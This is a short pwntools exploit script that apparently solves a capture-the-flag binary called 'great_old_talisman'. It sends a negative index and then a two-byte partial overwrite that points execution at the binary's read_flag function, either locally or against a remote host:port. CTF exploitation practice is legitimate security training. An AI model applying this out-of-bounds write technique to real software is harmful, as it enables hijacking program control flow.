#!/usr/bin/env python3

from pwn import context, p16, remote, sys

context.binary = 'great_old_talisman'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def main():
    p = get_process()

    p.sendlineafter(b'>> ', b'-4')
    p.sendafter(b'Spell: ', p16(context.binary.sym.read_flag & 0xffff))
    p.success(p.recv().decode())


if __name__ == '__main__':
    main()
